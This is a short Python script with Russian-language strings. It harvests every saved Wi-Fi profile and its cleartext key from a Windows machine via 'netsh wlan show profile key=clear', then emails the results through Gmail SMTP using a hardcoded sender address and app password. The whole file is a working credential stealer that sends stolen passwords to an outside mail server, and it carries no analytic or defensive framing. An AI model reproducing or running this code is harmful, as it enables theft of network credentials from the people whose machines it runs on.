import subprocess
import subprocess as sp
from xml.dom import minidom
from time import sleep
import platform as pf
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def extract_wifi_password():
    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('cp866').split('\n')
    #print(profiles_data)

    profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]
    #print(profiles)

    temp = []

    for profile in profiles:
        profile_info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear').decode('cp866').split('\n')
        #print(profile_info)
        try:
            password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
        except IndexError:
            password = None
        #print(f'Сеть: {profile}, Пароль: {password}')

        temp.append(f'Сеть: {profile}, Пароль: {password}\n')

    result = '=================\nПолученные данные\n=================\n'

    result = result + ''.join(temp)
    return result

def send_mail():
    sender = 'sender122135@gmail.com'
    password = 'tira omxk ggfu vyeo'

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    message = extract_wifi_password()
    msg = MIMEText(message)
    try:
        server.login(user=sender, password=password)
        server.sendmail(sender, sender, msg=f'{msg}')
        print('Сообщение доставлено! :)')
    except:
        print('Сообщение не доставлено :(')


def main():
    send_mail()

if __name__ == '__main__':
    main()